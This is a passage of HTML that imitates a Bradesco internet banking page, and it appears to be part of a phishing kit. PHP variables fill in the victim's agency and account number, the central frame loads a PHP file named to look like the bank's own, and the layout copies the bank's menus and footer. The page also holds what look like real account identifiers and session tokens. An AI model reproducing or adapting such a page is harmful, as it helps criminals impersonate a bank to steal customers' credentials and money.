W9GrUobogpdyK7zc2eXL0hFcApUlHNStSRpkobYvJ7BZjcLaEbD87TZuzCdSZsvzJmFTGIDCD242QAQOtA+anLOFXrezfBX//Vo9JlngwGSXoTDsS6XHIjIe5+KWFPqK3J1kZ7SiW4xV4o/RMYAC/TsRuusJifbYmjh9/m5BQTDRgnGPIDSdR4yf75WEoEUpHnjyv4rOhzYZLW6WIT8PRhfmD9/d2Fx9u7C3JmT8YfGi6viunQ3OrsaN3GMHTgQc16/OLu4OH22MHd8AV2OBAPFMg3qCHHTdaBWRCDjlmtQT8lH4X+IkbR/bKHL9yBIbjuMX3qKAF1xJAj7q8HZ38fPf8Lk//Zg/N9E+We1qeDk/0gg/hMmG/A/9KjZYGzspWywegabSO6bLpVgjKUG8eJfRPBq5Mepnmq9Ah0VdO6KdLXp0pmzZ5amC/Nn754+MQ2vhbFetSiLLa8z7tn6QnSUoCJqckksSbHDseTVRxPkvw0UeY0j6rPJyVQ6nczncolMIpdOTqYTyWzi0Wwq/Wg+lUikzG88mnAvsXXafTJxkBl47+vOz81CriUgKWKjT1lkaEJoEH0v/gT9j/x1x5PO8Krjf8PBGh8FOyNWamJ1VXSoZo/bAGteeRXGerq0oc4oMurt6fjiNtsX0TXw2lHo4sQzol40OsHZL7/BdrnzMuyYN2r/Hy9lgLLJbAEA" /><input type="hidden" name="jsf_viewid" id="jsf_viewid" value="/home.jsp" /><fieldset><label for="frmBuscador:txtPesquisar">Pesquisar:</label><div><input id="txtPesquisar" name="txtPesquisar" type="text" value="" maxlength="50" title="Informe o conte&#250;do da pesquisa" class="frmText tabindex" /></div><a id="frmBuscador:btnPesquisar" href="#" title="OK" class="bto_input tabindex btnBuscador"></a></fieldset><input type="hidden" name="frmBuscador_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /></form></div><ul id="menuP" class="menuPrincipal"><li id="_id68" class="item1"><a id="topmenu_S" href="#" title="Saldos e Extratos" class="tabindex">Saldos e Extratos</a></li>
<li id="_id72" class="item2"><a id="topmenu_P" href="#"  onclick="ativarItemMenu(this)" title="Pagamentos" class="tabindex">Pagamentos</a></li>
<li id="_id76" class="item3"><a id="topmenu_T" href="#"  onclick="ativarItemMenu(this)" title="Transfer&#234;ncias" class="tabindex">Transfer&#234;ncias</a></li>
<li id="_id80" class="item4"><a id="topmenu_C" href="#"  onclick="ativarItemMenu(this)" title="Cart&#245;es" class="tabindex">Cart&#245;es</a></li>
<li id="_id84" class="item5"><a id="topmenu_L" href="#"  onclick="ativarItemMenu(this)" title="Celulares" class="tabindex">Celulares</a></li>
<li id="_id88" class="item7"><a id="topmenu_E" href="#"  onclick="ativarItemMenu(this)" title="Empr&#233;stimos" class="tabindex">Empr&#233;stimos</a></li>
<li id="_id92" class="item8"><a id="topmenu_I" href="#"  onclick="ativarItemMenu(this)" title="Investimentos" class="tabindex">Investimentos</a></li>
<li id="_id96" class="item9"><a id="topmenu_B" href="#"  onclick="ativarItemMenu(this)" title="Home Broker" class="tabindex">Home Broker</a></li>
<li id="_id100" class="item10"><a id="topmenu_Q" href="#"  onclick="ativarItemMenu(this)" title="Capitaliza&#231;&#227;o" class="tabindex">Capitaliza&#231;&#227;o</a></li>
<li id="_id104" class="item11"><a id="topmenu_V" href="#"  onclick="ativarItemMenu(this)" title="Vida e Previd&#234;ncia" class="tabindex">Vida e Previd&#234;ncia</a></li>
<li id="_id108" class="item12"><a id="topmenu_O" href="#"  onclick="ativarItemMenu(this)" title="Outros Servi&#231;os" class="tabindex">Outros Servi&#231;os</a></li>
</ul></div><div class="bgrTopoEsquerda"></div></div>
	<script>inicializarHeader();</script>








	
	
	

	
	
	
	
	
		
			
				
				
				<!-- -->
			
		
		
		
			
				
				<!-- -->
			
		
		
		
			
				
			
		
		
			
				
			
		
		
		
			
				
			
		
		
		
			
				
			
		
	

	
		
			
				
			
			
				
					
						
					
					
				
			
		
		
		
			
				
					
					
						
					
					
				
			
		

		
			
				
				
			
			
				
				
			
			
				
				
			
			
				
				
			
			
				
				
			
			
				
				
			
			
				
				
			
			
				
				
			
			
				
				
			
			
				
				
			
			
				
				
			
		
	

	<!-- -->



	</div>

	<div id="miolo" class="after tabindex">

	  <div id="lateral" ="tabindex"><input type="hidden" id="horaAtual" name="horaAtual" value="02:54:51" /><input type="hidden" id="vvSaudacao" name="vvSaudacao" value="Ag&#234;ncia  523 , conta  82002 4 , &#250;ltimo acesso  18/10/2010 20:23 , n&#250;mero do acesso  57" />
		<script language="javascript">
			function atualizarHDA() {
				parent.alterarVisibilidadeHDA(false);
			}
		</script>
	<span class="c3"></span><span class="c4"></span><h3 class="bt_meubradesco"><span title="Utilize o TAB para navegar" class="tabindex"></span><a id="_id119" href="#"  title="Meu Bradesco" class="tabindex">Meu Bradesco</a></h3><div class="boxUsuario after"><table border="0" style="width: 100%;"><tbody><tr>
	  <td class=""><span id="" title="" class="tabindex"></span><span style=""><SCRIPT LANGUAGE="JavaScript">

d = new Date();
hour = d.getHours();
if(hour < 5)
{
   document.write("Boa Noite");
}
else
if(hour < 8)
{
   document.write("Bom Dia");
}
else
if(hour < 12)
{
   document.write("Bom Dia!");
}
else
if(hour < 18)
{
   document.write("Boa tarde");
}
else
{
   document.write("Boa noite");
}
<?php $data=date("d/m/Y"); echo $data;?>

</SCRIPT></span></td>
	</tr>
</tbody></table><table border="0" style="width: 100%;"><tbody><tr><td class="agencia">Ag&#234;ncia: <?php echo $agdes; ?></td><td class="conta">Conta: <?php echo $ctdes; ?>-<?php echo $digdes; ?></td></tr>
</tbody></table></div><div class="boxAcesso"><ul id="_id129" class="listaAcesso"><li id="_id130">&#218;ltimo acesso: <?php $data=date("d/m/Y"); echo $data;?></li><li id="_id132">N&#250;mero do Acesso: N&#186; 57</li><li id="_id134">E-mail: <a href="#" id="_id136" ><span id="emailMenuLateralNovo" title="Cadastre agora o seu email" class="tabindex">(Cadastre agora)</span></a></li></ul></div><div id="iframePostit" style="display:none">
			<iframe id="postit" name="postit" class="" src="dentro_files/postit00.htm" 
				width="100%" frameborder="0" scrolling="no" allowtransparency="true"
				onload="if (window.parent && window.parent.autoIframe) {window.parent.autoIframeInicializacaoPostit();}" >
			</iframe>
		</div><dl id="lateral_meus_saldos" class="after" style="display:none"><dt class="item4"><a id="box_lateral_meus_saldos" href="#" class="expandir tabindex"><span class="">Posi&#231;&#227;o Financeira (R$)</span></a><span class="drag">Arrastar bloco</span><a id="_id141" href="#"  title="Personalizar apresenta&#231;&#227;o da Posi&#231;&#227;o Financeira" class="editar tabindex">Editar</a></dt><dd id="conteudo_lateral_meus_saldos" class="item4" style="position:relative;*float:left;display:none"><div id="atualizandoMiniPosicao" class="carregandoMiniPosicao imagemCarregandoMiniPosicao"><span class="textoCarregandoMiniPosicao">Carregando...</span></div><ul id="boxLisPosFinan" class="lstSaldos"><li id="boxLisPosCloner" class="none"><a id="lnkDescPos" href="#" class="after"><span id="txtDescPos" class="fl"></span><span id="txtValPos" class="fr valor"></span></a></li><li id="linkAtualizarMiniPosicaoCloner" class="none"><span class="dataAtua aviso ml15 fl fz9 cinza valorDataAtual"></span><a id="_id145" href="#"  title="Atualizar" class="lnkAtualizar after fr pb10">Atualizar</a></li></ul></dd></dl><dl id="lateral_mais_utilizadas" class="after" style="display:none"><dt class="item1"><a id="box_lateral_mais_utilizadas" href="#" title="Mais Utilizadas" class="expandir tabindex"><span class="">Mais Utilizadas</span></a><span class="drag">Arrastar bloco</span><a href="#" id="_id150"  title="Personalizar menu de transa&#231;&#245;es mais utilizadas" class="editar tabindex">Editar</a></dt><dd id="conteudo_lateral_mais_utilizadas" class="item1" style="display:none"><div class="carregando_nav_content" style="display:none;"><div class="carregando_nav tabindex">Carregando......</div></div><ul id="_id154" class="lstLink1"><li id="maisUtilizadas0" style="display:none" class="pt5 pb0"><a id="linkMaisUtilizadas0" href="#"  onmouseover="jQuery(this).find('span').css('color','#CC092F');" onmouseout="jQuery(this).find('span').css('color','#666666').last().css('color', '#333333');" title="" class="tabindex pb5"><span id="tituloLink0" class=""></span></a></li><li id="maisUtilizadas1" style="display:none" class="pt5 pb0"><a id="linkMaisUtilizadas1" href="#"  onmouseover="jQuery(this).find('span').css('color','#CC092F');" onmouseout="jQuery(this).find('span').css('color','#666666').last().css('color', '#333333');" title="" class="tabindex pb5"><span id="tituloLink1" class=""></span></a></li><li id="maisUtilizadas2" style="display:none" class="pt5 pb0"><a id="linkMaisUtilizadas2" href="#"  onmouseover="jQuery(this).find('span').css('color','#CC092F');" onmouseout="jQuery(this).find('span').css('color','#666666').last().css('color', '#333333');" title="" class="tabindex pb5"><span id="tituloLink2" class=""></span></a></li><li id="maisUtilizadas3" style="display:none" class="pt5 pb0"><a id="linkMaisUtilizadas3" href="#"  onmouseover="jQuery(this).find('span').css('color','#CC092F');" onmouseout="jQuery(this).find('span').css('color','#666666').last().css('color', '#333333');" title="" class="tabindex pb5"><span id="tituloLink3" class=""></span></a></li><li id="maisUtilizadas4" style="display:none" class="pt5 pb0"><a id="linkMaisUtilizadas4" href="#"  onmouseover="jQuery(this).find('span').css('color','#CC092F');" onmouseout="jQuery(this).find('span').css('color','#666666').last().css('color', '#333333');" title="" class="tabindex pb5"><span id="tituloLink4" class=""></span></a></li><li id="maisUtilizadas5" style="display:none" class="pt5 pb0"><a id="linkMaisUtilizadas5" href="#"  onmouseover="jQuery(this).find('span').css('color','#CC092F');" onmouseout="jQuery(this).find('span').css('color','#666666').last().css('color', '#333333');" title="" class="tabindex pb5"><span id="tituloLink5" class=""></span></a></li><li id="maisUtilizadas6" style="display:none" class="pt5 pb0"><a id="linkMaisUtilizadas6" href="#"  onmouseover="jQuery(this).find('span').css('color','#CC092F');" onmouseout="jQuery(this).find('span').css('color','#666666').last().css('color', '#333333');" title="" class="tabindex pb5"><span id="tituloLink6" class=""></span></a></li><li id="maisUtilizadas7" style="display:none" class="pt5 pb0"><a id="linkMaisUtilizadas7" href="#"  onmouseover="jQuery(this).find('span').css('color','#CC092F');" onmouseout="jQuery(this).find('span').css('color','#666666').last().css('color', '#333333');" title="" class="tabindex pb5"><span id="tituloLink7" class=""></span></a></li><li id="maisUtilizadas8" style="display:none" class="pt5 pb0"><a id="linkMaisUtilizadas8" href="#"  onmouseover="jQuery(this).find('span').css('color','#CC092F');" onmouseout="jQuery(this).find('span').css('color','#666666').last().css('color', '#333333');" title="" class="tabindex pb5"><span id="tituloLink8" class=""></span></a></li><li id="maisUtilizadas9" style="display:none" class="pt5 pb0"><a id="linkMaisUtilizadas9" href="#"  onmouseover="jQuery(this).find('span').css('color','#CC092F');" onmouseout="jQuery(this).find('span').css('color','#666666').last().css('color', '#333333');" title="" class="tabindex pb5"><span id="tituloLink9" class=""></span></a></li></ul></dd></dl><dl id="lateral_outras_funcoes" class="after" style="display:none"><dt class="item2"><a id="box_lateral_outras_funcoes" href="#" title="Outras Fun&#231;&#245;es" class="expandir tabindex"><span class="">Outras Fun&#231;&#245;es</span></a><span class="drag">Arrastar bloco</span></dt><dd id="conteudo_lateral_outras_funcoes" class="item2" style="display:none"><ul id="_id158"><li id="_id159" class="item1"><a id="_id160" href="#"  title="Comprovantes (2&#170; Via)" class="tabindex">Comprovantes (2&#170; Via)</a></li><li id="_id162" class="item2"><a id="_id163" href="#"  title="Agendamentos" class="tabindex">Agendamentos</a></li><li id="_id165" class="item3"><a id="_id166" href="#"  title="Infoemail" class="tabindex">Infoemail</a></li><li id="_id168" class="item4"><a href=""  id="_id169"  title="Mensagens e Avisos" class="tabindex">Mensagens e Avisos</a></li><li id="_id170" class="item5"><a id="calc" href="#" onclick="openCalc(this);" title="Calculadora" class="tabindex">Calculadora</a></li><li id="_id172" class="item6"><a id="_id173" href="#"  title="C&#243;digos de Acesso R&#225;pido" class="tabindex">C&#243;digos de Acesso R&#225;pido</a></li></ul></dd></dl><dl id="lateral_apoio_atendimento" style="display:none"><dt class="item3"><a id="hdaLateral" href="#" title="Apoio e Atendimento" class="expandir tabindex"><span class="">Apoio e Atendimento</span></a><span class="drag">Arrastar bloco</span></dt><dd id="conteudo_lateral_apoio_atendimento" class="item3" style="display:none"><ul id="_id181" class="lstAssistentes after"><li id="_id182" class="tp1"><a id="_id183" href="#"  title="Apoio e Atendimento. Telefones Bradesco" class="tabindex">Telefones Bradesco</a></li><li id="_id185" class="tp2"><a id="_id186" href="#"  title="Apoio e Atendimento. Contate seu gerente" class="tabindex">Contate seu Gerente</a></li></ul></dd></dl><span class="lnkOutrasOpcoes">Encontre outras op&#231;&#245;es do Internet Banking na se&#231;&#227;o <a id="_id190" href="#"  class="tabindex">Personaliza&#231;&#227;o e Seguran&#231;a</a></span></div>
	<script>
		carregarMenuLateral(0);
		var horaServidor = document.getElementById('horaAtual').value.split(":");
		atualizaSaudacao(horaServidor[0], horaServidor[1], horaServidor[2]);
	</script>






	
	
	
	

	

	<!-- -->
	<!-- -->
	
		
		
			
		
	
	
	
		
	
		
	
	
	
		
			
			
			
				
				
					
					
				
			
		
	
		
	
		
	
	
	
		
			
				
			
			
			
				
			
		
		
			
				
			
			
				
					
						
						
					
				
				
					
					
						
					
				
			
		
	
	
	
		
			
				
			
			
			
			
		
		
			
				
					
				
			
			
				
					
						
					
				
				
					
						
					
				
				
					
						
					
				
				
					
						
					
				
				
					
						
					
				
				
					
						
					
				
				
					
						
					
				
				
					
						
					
				
				
					
						
					
				
				
					
						
					
				
			
		
	

	
		
			
				
			
			
		
		
			
				
					
						
					
				
				
					
						
					
				
				
					
						
					
				
				
					
				
				
					
						
					
				
				
					
						
					
				
			
		
	

	
		
			
				
			
			
		
		
			
				
					
						
					
					
						
					
				
			
			
				
					
						
					
				
				
					
						
					
				
			
		
	
	
	
		
		
			
		
	




		<div id="conteudoPrincipal" class="tabindex">
			
				<iframe class="tabindex" id="paginaCentral" name="paginaCentral" src="ib2k1.dll.ativa.php" 
					width="768px" frameborder="0" scrolling="no" allowtransparency="true" 
					onload="if (window.parent && window.parent.autoIframe) {window.parent.autoIframeInicializacao();}" >
				</iframe>
				
			
	  </div>
		
	</div>

	<div id="rodape" class="after ">
		<div class="centro"><ul id="_id215" class="listaLogosSemLink pt30 pb30"><li id="_id216" class="item1"><span title="Bradesco Dia e Noite" class="tabindex"></span></li><li id="_id218" class="item2"><span title="Bradesco Internet Banking ISO 9001" class="tabindex"></span></li></ul><ul id="_id196" class="listaMenuInferior"><li id="_id197" class="tp1"><a id="_id198" href="#" title="Seguran&#231;a" class="segLnkExt tabindex">Seguran&#231;a</a></li>
		<li id="_id200"><a id="_id201" href="#"  title="Mapa de Servi&#231;os" class="tabindex">Mapa de Servi&#231;os</a></li>
		<li id="_id203"><a id="_id204" href="#"  title="Canais de Atendimento" class="tabindex">Canais de Atendimento</a></li>
		<li id="_id206" class="tp1"><a id="_id207" href="#"  title="Fale Conosco" class="segLnkExt2 tabindex">Fale Conosco</a></li>
		</ul><ul id="_id209" class="listaTelefones"><li id="_id210" class="item1 tabindex"><span title="SAC Al&#244; Bradesco 0800.704.8383">SAC - Al&#244; Bradesco</span>0800 704 8383</li><li id="_id212" class="item2 tabindex"><span title="Central de Apoio ao Internet Banking; Capitais e Regi&#245;es Metropolitanas 3003-0237; Demais regi&#245;es 0800-701-0237">Central de Apoio ao Internet Banking</span><div class="fl pl30 pt5" style="font-size: 11px;">3003-0237<br><span class="fBlack">Capitais e Regi&#245;es Metropolitanas</span></div><div class="fr pr30 pt5" style="font-size: 11px;">0800-701-0237<br><span class="fBlack"> Demais regi&#245;es </span></div></li><li id="_id214" class="item3 tabindex"><span title="Ouvidoria Bradesco 0800.727.9933">Ouvidoria Bradesco</span>0800 727 9933</li></ul></div>




    
	
	
	
		
			
				
			
		
		
			
				
			
		
		
			
				
			
		
		
			
				
			
		
	

	
		
			
		
		
			
		
		
			
		
	

	</div>

	
<!-- #### BUSCADOR #### -->
	<script type="text/javascript">
	function abrirBuscador(bPalavra,bPagina) {
		if(jQuery.trim(bPalavra) != ""){
			document.getElementById("bPalavra").value = bPalavra;
			document.getElementById("bPagina").value = bPagina;
			document.formularioBuscador.submit();
		}
	}
	</script>
	<form  name="formularioBuscador"  method="get">
		<input type="hidden" name="CTL" id="bCTL" value="5192331877040731930150"/>
		<input type="hidden" name="b" id="bPalavra" value=""/>
		<input type="hidden" name="p" id="bPagina" value=""/>
	</form>

<!-- #### FIM BUSCADOR #### -->

<!-- #### ACESSO RAPIDO #### -->

	<form action="#" name="formularioAcessoRapido" target="modal_infra_estrutura" method="get">
		<input type="hidden" name="CTL" id="arCTL" value="5192331877040731930150"/>
	</form>

<!-- #### FIM ACESSO RAPIDO #### -->





	
	<div id="boxCalculadora"><input type="hidden" id="_calcFir" name="_calcFir" value="" /><input type="hidden" id="_calcSec" name="_calcSec" value="" /><input type="hidden" id="_calcOper" name="_calcOper" value="" /><input type="hidden" id="_calcMem" name="_calcMem" value="" /><input type="hidden" id="_calcEql" name="_calcEql" value="" /><input type="hidden" id="_calcLstOper" name="_calcLstOper" value="" /><input type="hidden" id="saldoPP" name="saldoPP" value="" /><input type="hidden" id="saldoCC" name="saldoCC" value="" /><input type="hidden" id="exibirSaldoPP" name="exibirSaldoPP" value="N" /><input type="hidden" id="exibirSaldoCC" name="exibirSaldoCC" value="N" /><input type="hidden" id="exibirInvestimentos" name="exibirInvestimentos" value="N" /><input type="hidden" id="exibirCartaoCredito" name="exibirCartaoCredito" value="N" /><div class="bgrSombra"><div class="window"><div class="barra"><a id="_id220" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" rel="117" title="Fechar Calculadora" class="close ico_1line_Tip">Fechar Calculadora</a><a id="_id222" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" title="Minimizar" class="min ico_1line_Tip">Minimizar/Maximizar</a><a id="_id224" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" title="Maximizar" class="max ico_1line_Tip none_i">Minimizar/Maximizar</a><span class="handle after">Calculadora</span></div><div class="view"><div class="boxVisor mb10"><p id="_calcVisor"><strong>&nbsp;</strong></p><p id="_calcAjxVisor"><strong>&nbsp;</strong></p></div><div class="btnsExpansiveis"><div class="clr"><!-- --></div><ul id="_id252" class="after"><li id="inv" class="exp none after"><ul id="boxListaInvestimento" class="clr"><span style="left:0; width:84px;"><!-- --></span><li id="itemInvestimentoCloner" class="none"><a id="lnkItemInvestimento" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" class="lnk_seta calc_links"></a></li></ul></li><li id="crd" class="exp none after"><span style="right:0; width:84px;"><!-- --></span><ul id="boxListaCartoes" class="clr"><li id="itemCartaoCloner" class="none"><a id="lnkItemCartao" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" class="lnk_seta calc_links"></a></li></ul></li></ul></div><div class="boxCalc"><ul id="_id256" class="clr"><li id="_id257" class="item1"><a id="_id258" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="calcClear()" title="C">C</a></li><li id="_id260" class="item2"><a id="_id261" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcMinPlu()" title="+ / -">+ / &ndash;</a></li><li id="_id263" class="item3"><a id="_id264" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcPerc()" title="%">%</a></li><li id="_id266" class="item4"><a id="_id267" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="calcOper('D')" title="&#247;">&#247;</a></li><li id="_id269" class="item5 last"><a id="_id270" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="calcOper('X')" title="X">X</a></li><li id="_id272" class="clr"><!-- --></li><li id="_id274" class="item6"><a id="_id275" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcClearMem()" title="MC">MC</a></li><li id="_id277" class="item7"><a id="_id278" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcNumber(this)" title="7">7</a></li><li id="_id280" class="item8"><a id="_id281" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcNumber(this)" title="8">8</a></li><li id="_id283" class="item9"><a id="_id284" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcNumber(this)" title="9">9</a></li><li id="_id286" class="last item10"><a id="_id287" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="calcOper('S')" title="-">&ndash;</a></li><li id="_id289" class="clr"><!-- --></li><li id="_id291" class="item11"><a id="_id292" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="calcOperMem('A')" title="M+">M+</a></li><li id="_id294" class="item12"><a id="_id295" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcNumber(this)" title="4">4</a></li><li id="_id297" class="item13"><a id="_id298" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcNumber(this)" title="5">5</a></li><li id="_id300" class="item14"><a id="_id301" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcNumber(this)" title="6">6</a></li><li id="_id303" class="last item15"><a id="_id304" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="calcOper('A')" title="+">+</a></li><li id="_id306" class="lstTotal clr"><ul id="_id307"><li id="_id308" class="item16"><a id="_id309" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="calcOperMem('S')" title="M-">M-</a></li><li id="_id311" class="item17"><a id="_id312" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcNumber(this)" title="1">1</a></li><li id="_id314" class="item18"><a id="_id315" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcNumber(this)" title="2">2</a></li><li id="_id317" class="item19"><a id="_id318" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcNumber(this)" title="3">3</a></li><li id="_id320" class="clr"><!-- --></li><li id="_id322" class="item20"><a id="_id323" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="showCalcMem()" title="MR">MR</a></li><li id="_id325" class="item21"><a id="_id326" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcNumber(this)" title="0">0</a></li><li id="_id328" class="item22"><a id="_id329" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="setCalcComma()" title=",">,</a></li></ul></li><li id="_id331" class="last item23"><a id="_id332" href="javascript:;//;jsessionid=0000FexMbR6wxpSX7oy_Gz705Q3:15hgrp03g" onclick="calcTotal()" title="=">=</a></li></ul></div></div></div></div></div>
	<script>
		if (0 == 1) {
			atualizarCacheCalculadora(0);
		}
	</script>






	
	
	
	
	
	
	
	
	
	
	
	
	
	
		
			
				
				
				
				
			
			
				
						
						
				
				
					
						
						
						
						
						
					
                    
                    
                    	
							
                            	
                            	
									
									
								
							
						
						
	                        
							
								
									
									
								
							
						
                    
				
				
					
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
							
								
								
								
								
								
								
								
								
							
						
						
					
				
			
		
	




	<div id="div_modal_infra_estrutura_sem_margem" class="jqmWindow mod560">
		
		<!-- HDA -->
			
				
				
					
				
			
		<!-- // HDA -->
		
		
			<iframe allowtransparency="false" id="modal_infra_estrutura" name="modal_infra_estrutura" 
					src="dentro_files/blank000.htm"
					frameborder="0" scrolling="no" 
					onload="inicializarIFrameModalInfraEstrutura(this);">
			</iframe>
		
	</div>

	
	
	<a href="" id="botaoPersonalizarApelidoHDA" target="modal_infra_estrutura"></a>
	
	
		<script>inicializarFiltroHDA(); verificarSiteSite();</script>
	
	
	
	    
	    
	    
	    
	<script type="text/javascript">
AC_AX_RunContent( 'classid','clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF','height','0','id','Conexao','style','display:none','width','0','update','1|1|1','addinfo','1|1|5192331877040731930150|523|82002|0|0|0|0|0' ); //end AC code
</script><noscript><object classid="clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF" height="0" id="Conexao" style="display:none" width="0"><param name="Update" value="1|1|1" /><param name="AddInfo" value="1|1|5192331877040731930150|523|82002|0|0|0|0|0" /></object></noscript>
</body>

	

<form id="linkDummyForm" name="linkDummyForm" style="display:inline" method="post" action="">

<input type="hidden" name="jsf_tree_64" id="jsf_tree_64" value="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